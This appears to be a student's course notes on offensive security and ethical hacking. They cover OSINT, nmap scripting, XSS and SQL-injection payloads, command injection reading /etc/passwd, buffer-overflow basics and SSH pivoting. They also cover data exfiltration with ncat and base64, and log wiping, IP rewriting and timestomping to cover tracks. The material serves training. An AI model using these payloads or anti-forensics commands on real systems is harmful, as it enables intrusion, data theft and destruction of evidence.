penetration = ethical hacking

Testing
Exploit Development occurs from vulnerability pairing and mission-drivens requirement
Test and verify success
Testing provides a number of benefits:
Faster time to breakout of initial foothold
Reduced risk of detection and/or tool failure
Improved recovery times

Plan
Procure Hardware and software
Assign developer
Assign a tester to develop TTPs and break it
Document testing results
Testing environment

Open Source Intelligence
During the lesson we will review the following topics:
Appropriate Documentation Practices
Use of Collected Data
Collection Methods

DoD States:
"produced from publicly available information that is collected, exploited, and disseminated in a timely manner to an appropriate audience for addressing a specific intelligence requirement."
only use open source research for mission completion meeting a specific intelligence requirement

Documentation
Why is it important?
What should we include in documentation?
basically take opnotes to document what you did and how

Collection and Use
What do we want to collect?
How can it be used in operations?
We never reveal our sources and methods which indicates a NOFORN classification

Limitations on Collection
Are there rules that guide our operations and collection parameters?
What are important factors when collecting data about a target?

Data to Collect
Web Data
Sensitive Data
Publicly Accessible
Social Media
Domain and IP Data

Deep web = unlisted addresses ex. signing into your banck account

Hyper-Text Markup Language (HTML)
Standardized markup language for browser interpretation of webpages

Client-side interpretation (web browser)
Utilizes elements (identified by tags)
Typically redirects to another page for server-side interaction
Cascading Stylesheets (CSS) for page themeing
can use view page source to view a website's source code, but use a website scraper for bigger/confusing websites

Advanced Scanning Techniques
HOST DISCOVERY
Find hosts that are online
HOST ENUMERATION
Find ports for each host that is online
HOST INTERROGATION
Find what service is running on each open/available port

NMAP Scripting Engine
During the lesson we will review the following topics:
Benefits of Scanning with Scripts
Script Management and Utilization
Usage and Examples

nmap can be used with several different scripts to achieve certain information

Script Management
Scripts are stored in a subdirectory of the Nmap data directory by default:
/usr/share/nmap/scripts

Usage and Examples
nmap --script <filename>|<category>|<directory>
nmap --script-help "ftp-* and discovery"
nmap --script-args <args>
nmap --script-args-file <filename>
nmap --script-help <filename>|<category>|<directory>
nmap --script-trace

========================== Web Exploitation Day 1 (XSS) ====================================
Server/Client Relationship
Synchronous communications between user and services
Not all data is not returned, client only receives what is allowed

Hyper-Text Transfer Protocol (HTTP)
Request/Response
Various tools to view:
tcpdump
wireshark
Developer Console
ex.
GET / HTTP/1.1
HTTP/1.1 200 OK

HTTP Methods
A Select Few:
GET
POST
HEAD
PUT

HTTP Response Codes
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

HTTP Fields
User-Agent
Referer
Cookie
Date
Server
Set-Cookie

HTTP Method Notes
GET request can be utilized to pass data to the server using the URL string:
https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1/something.php?var=hi

Wget
Recursively download
Recover from broken transfers
SSL/TLS support
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php

cURL
Not recursive
Can use pipes
Upload ability
Supports more protocols vs Wget, such as SCP & POP3
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png

JavaScript (JS)
Allows websites to interact with the client
JavaScript runs on the client’s machine
Coded as .JS files, or in-line of HTML
can run javascript commands by pulling up developer tools and using console

JS Interaction
<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>

Enumeration
ROBOTS.TXT
Legitimate surfing
Tools:
NSE scripts
Nikto
Burp suite (outside class)

Cross-Site Scripting (XSS) Overview
Insertion of arbitrary code into a webpage, that executes in the browser of visitors
Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
Often found in forums that allow HTML

Reflected XSS
Most common form of XSS
Transient, occurs in error messages or search results
Delivered through intermediate media, such as a link in an email
Characters that are normally illegal in URLs can be Base64 encoded
Below is what you see, but the server will decode as name=abc123

Stored XSS
Resides on vulnerable site
Only requires user to visit page
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">

Useful JavaScript Components
Proof of concept (simple alert):
<script>alert('XSS');</script> (TRY SINGLE AND DOUBLE QUOTES UNTIL IT BREAKS)
Capturing Cookies
document.cookie
Capturing Keystrokes
bind KEYDOWN and KEYUP
Capturing Sensitive Data
document.body.innerHTML

Server-Side injection
Directory Traversal/Path Traversal
Ability to read/execute outside web server’s directory
Uses ../../ (relative paths) in manipulating a server-side file path

Malicious File Upload
Site allows unsanitized file uploads
Server doesn’t validate extension or size
Allows for code execution (shell)
Once uploaded
Find your file
Call your file

Command Injection
Application on the server is vulnerable,
allowing execution of arbitrary commands
User input not validated
Common example is a SOHO router, with a web page to allow ping
Might contain the following in it’s code:
system("ping -c 1 ".$_GET["ip"]);
Run the following to chain/stack our arbitrary command
; cat /etc/passwd

when using firefox use F12 to bring up developer tools then check the inspector and network tabs

================================== SQL =====================================

SQL
S tructured Q uery L anguage - ANSI Standard
Additional commands added by vendors
Relational

Standard Commands --------------------------------------------------------------------
SELECT
Extracts data from a database

UNION
Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS

USE
Selects the DB to use

UPDATE
Updates data in a database

DELETE
Deletes data from a database

INSERT INTO
Inserts new data into a database

CREATE DATABASE
Creates a new database

ALTER DATABASE
Modifies a database

CREATE TABLE
Creates a new table

ALTER TABLE
Modifies a table

DROP TABLE
Deletes a table

CREATE INDEX
Creates an index (search key)

DROP INDEX
Deletes an index

----------------------------------------------------------------------------

SQL Injection - Considerations
Requires Valid SQL Queries
Fully patched systems can be vulnerable due to misconfiguration
Input Field Sanitization
String vs Integer Values
Is INFORMATION_SCHEMA Database available?
GET Request versus POST Request HTTP methods

Unsanitized vs Sanitized Fields ----------------------------------------------
Unsanitized: input fields can be found using a Single Quote ⇒ '
Will return extraneous information
' closes a variable, to allow for additional statements/clauses
May show no errors or generic error (harder Injection)

Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)

Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')

-----------------------------------------------------------------------------

Server-Side Query Processing
User enters JOHNDOE243 in the name form field and PASS1234$ in the pass form field.
The Server-Side Query that would be passed to MySQL from PHP would be:
BEFORE INPUT:
SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
AFTER INPUT:
SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;

Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields.
Truth Statement: tom ' OR 1='1
Server-Side query executed would appear like this:
SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
(By default there are '' at the beginning and end of the WHERE statement values given, this is random which means you havt to phanangle it)
find a vulnerable field where you can enter information and then use the sql injection to get the database 
to find a vulnerable field insert USER ' OR 1='1 (might have to mess around with the quotes for best results)
POST methods mean you are entering information (try multiple fields (exploiting lazy programmer))


GET methods have you use the URL bar to see the variable you use to add 1=1 where after you find the vulnerability use <pretext> UNION select 1,2,3 to see the columns and what numbers they are
<pretext> UNION select table_schema, table_name, column_name from information_schema.columns (since you're breaking the datbases you can only work with the amount of columns you have, meaning you would have to add placeholders if there is more than 3)

Stacking Statements
Chaining multiple statements together using a semi-colon ;
SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’

Nesting statements
Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
Though they may allow for nesting a statement within an existing one:
php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

Ignore the rest
Using # or -- tells the Database to ignore everything after
Server-Side Query:
SELECT product FROM item WHERE id = $select limit 1;
Input to Inject:
1 OR 1=1; #
Server-Side Query becomes:
SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;

=========================================== REVERSE ENGINEERING ================================================

X86_64 Assembly
There are 16 general purpose 64-Bit registers
%rax
the first return register

%rbp
the base pointer that keeps track of the base of the stack

%rsp
the stack pointer that points to the top of the stack

%rip
instruction pointer registry which holds next instruction

You will see arguments passed to functions as something like:
[%ebp-0x8]

X86_64 Assembly - Common Terms
HEAP
Memory that can be allocated and deallocated

STACK
A contiguous section of memory used for passing arguments

GENERAL REGISTER
A multipurpose register that can be used by either programmer or user to store data or a memory location address

CONTROL REGISTER
A processor register that changes or controls the behavior of a CPU

FLAGS REGISTER
Contains the current state of the processor

X86_64 Assembly - Memory Offset
There is one instruction pointer register that points to the memory offset of the next instruction in the code segment:

64-Bit	Lower 32 bits	Lower 16 bits	Descrition
RIP
        EIP
                        IP
                                        Instruction Pointer; holds address for next instruction to be executed

X86_64 Assembly - Common Instruction Pointers
MOV
move source to destination

PUSH
push source onto stack

POP
Pop top of stack to destination

INC
Increment source by 1

DEC
Decrement source by 1

ADD
Add source to destination

SUB
Subtract source from destination

CMP
Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.

JMP
Jump to specified location

JLE
Jump if less than or equal

JE
Jump if equal

JZ (This and JNZ used after compares to use the value given)
Jump if zero

JNZ
Jump if not equal

Reverse Engineering Workflow (Software)
Static - Know what architecture your gonna be on by running file and ida/ghidra and using strings on it to get any plain text
Behavioral - using process monitor to record what the malware does and how 
Dynamic - run a debugger to step through the malware to see how it works
Disassembly - use ida or ghidra to figure out exactly what the malware does
Document Findings - Opnote time

Portable Executable Patching / Software Analysis
Perform DEBUGGING and DISASSEMBLY
Find the SUCCESS/FAILURE
Adjust INSTRUCTIONS
Apply Patch and Save
Execute Patched Binary

ASSEMBLY READS RIGHT TO LEFT

Quick example: 'a', 'A', 'A', 1) # is used in a vulnerable username port to give it admin privileges

=============================== EXPLOIT DEVELOPMENT ====================================

BUFFER OFERFLOW COMMON TERMS
HEAP
Memory that can be allocated and deallocated

STACK
A contiguous section of memory used for passing arguments

REGISTERS
Storage elements as close as possible to the central processing unit (CPU)

INSTRUCTION POINTER (IP)
a.k.a Program Counter (PC), contains the address of next instruction to be executed

STACK POINTER (SP)
Contains the address of the next available space on the stack

BASE POINTER (BP)
The base of the stack

FUNCTION
Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient

SHELLCODE
The code that is executed once an exploit successfully takes advantage of a vulnerability

Buffer Overflow Defenses
Non executable (NX) stack
Address Space Layout Randomization (ASLR)
Data Execution Prevention (DEP)
Stack Canaries
Position Independent Executable (PIE)

Technical Help
Utilizing tools such as:
IDA, GHIDRA
GDB, MONA, IMMUNITY
BASH, PYTHON

GDB Uses
Installation of Peda Plugin
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
Common Commands
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point

============================= POST EXPLOITATION ====================================

SSH Overview
Basic Characteristics:
Access remote systems using an SSH server as a proxy
Securely transfer files
Execute commands on a remote system
VPN using the SSH protocol as a transport
Forwarding the X Window System display to the client system

Linux Targets
Local Port Forward
-L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
Remote Port Forward
ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT

Windows Targets
Port Proxying
netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<LocalPort>
netsh interface portproxy reset

Control Sockets
Benefits Provided Include:
Multiplexing
Data exfiltration
Less logging

Two main ways to configure:
Command Line Method
ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
ssh -S /tmp/s x@x
scp -o 'ControlPath=/tmp/s' x@x:<Path>

Configuration File Method (~/.ssh/ssh_config)
HostName *
ControlPath ~/.ssh/controlmasters/%r@%h:%p
ControlMaster auto
ControlPersist 10m

User Enumeration
Why is this important?
What does it provide?
Windows
net user
Linux
cat /etc/passwd

Process Enumeration
Why is this important?
What does it provide?
Windows
tasklist /v
Linux
ps -elf

Service Enumeration
Why is this important?
What does it provide?
Windows
tasklist /svc
Linux
chkconfig                   # SysV
systemctl --type=service    # SystemD

Network Connection Enumeration
Why is this important?
What does it provide?
Windows
ipconfig /all
Linux
ifconfig -a      # SysV (deprecated)
ip a             # SystemD

Data Exfiltration
Session Transcript
 ssh <user>@<host> | tee
Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64
Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64
Encrypted Transport
scp <source> <destination>
ncat --ssl <ip> <port> < <file>

==================================== Privilege Escalation, Persistence & Covering Your Tracks Linux ========================================

SUDO, run sudo -l to see what you can do
SUDO Gotchas!
Commands that can access the contents of other files
Commands that download files
Commands that execute other commands (i.e. editors)
Dangerous commands

SUID/SGID
What is SUID/SGID?
Why should you consider it for privilege escalation?
What commands should you run?
who can run the file as either the owner or within the group given permission
find / -type f -perm /4000 -ls 2>/dev/null can find all files with suid bit set while a 2000 would look for a guid set (or 6000 for both)
can input what binaries you can run in GTFObins to see how to privilege escalate with given sudo commands or using the suid or sgid permissions 

Insecure Permissions
CRON
World-Writable Files and Directories
Dot '.' in PATH
files like /tmp and /var/tmp are world writeable which means anyone can put things in and take things out of them
if a user has a '.' in their $PATH you can replace (can add by doing PATH=.:$PATH) you can then create a file ex. ls and set #!/bin/bash and put whatever code you want and chmod +x which will now allow it to be run with ls
if you do this you would have to specify the full path of ls now though
cat /etc/crontab to see whats set to run and then check the further directories like cron.d or cron.hourly (crontab -l to see for particular users) check /var/syslog

Adding or Hijacking a User Account
Adding vs hijacking a user account
User account considerations?
How should you access it?
creating a user to access in the future (need to escalate to get root access with said account)

Boot Process Persistence
Where and how do you implement?
Why should you consider it for persistence?
How should you access it?

Cron Job
System vs user CRON
Why should you consider it for persistence?
How should you access it?

COVERING YOUR TRACKS 
Plan
Prior, after, before (Know the system!)
What will happen if I do X (What logging?)
Checks (Where are things?)
Hide (File locations, names, times)
When do you start covering your tracks?

System usage
Where to work from on the remote system? Why?
Are system resources important?

NIX-ism
First thing: unset HISTFILE
Need to be aware of of init system in use
SystemD, to name a few
Determines what commands to use and logging structure

Ways To Figure Out Init Type
ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1

Auditing SystemV
ausearch: Pulls from audit.log
ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i

SystemD
Utilzes journalctl`
journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603

Logs for Covering Tracks
Logs typically housed in /var/log & useful logs:
--auth.log/secure
Logins/authentications
--lastlog
Each users' last successful login time
--btmp
Bad login attempts
--sulog
Usage of SU command
--utmp
Currently logged in users (W command)
--wtmp
Permanent record on user on/off

Working With Logs
file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4

Reading Files
cat /var/log/auth.log | egrep -v "opened|closed"
awk '/opened/' /var/log/auth.log
last OR lastb OR lastlog
strings OR dd            # for data files
more /var/log/syslog
head/tail
Control your output with pipes | and more

Cleaning The Logs
Before we start cleaning, save the INODE!
Affect on the inode of using mv VS cp VS cat
Know what we are removing (Entry times? IP? Whole file? Etc.)

Cleaning The Logs (Basic)
Get rid of it
rm -rf /var/log/...
Clear It
cat /dev/null > /var/log/...
echo > /var/log/...

Cleaning The Logs (Precise)
Always work off a backup!
GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2 +
SED (Replace)
cp auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log +

Timestomp (Nix)
Access: updated when opened or used (grep, ls, cat, etc)
Modify: update content of file or saved
Change: file attribute change, file modified, moved, owner, permission

Timestomp (Nix)
Easy with Nix vs Windows (Native change of Access & Modify times)
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference
Changing the change time requires changing the system time than touch the file. Could cause serious issues!

Remote Logging
Check the config!
Identify server being shipped to!
Identify which logs are being shipped
[EMPHASIS]#Rsyslog? Need to be thorough!
New version references multiple files for rules

Rsyslog
Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
Older version only uses /etc/rsyslog.conf`
Find out
grep "IncludeConfig" /etc/rsyslog.conf

Reading Rsyslog
Utilizes severity (priority) and facility levels
Rules filter out, and can use keyword or number
<facility>.<priority>

Rsyslog Examples
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*. *  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*
rsyslog means that remote logs are being sent to another box that is show in the rsyslog file stored in /var/log/(something rsyslog related)

if there is a beacon look for a pattern in tcpdump filtering out noise and then find a way to use netcat  and listen for one of the ports on the loopback (or 0.0.0.0)
remote logging is at bottom of rsyslog (make sure all not commented out)


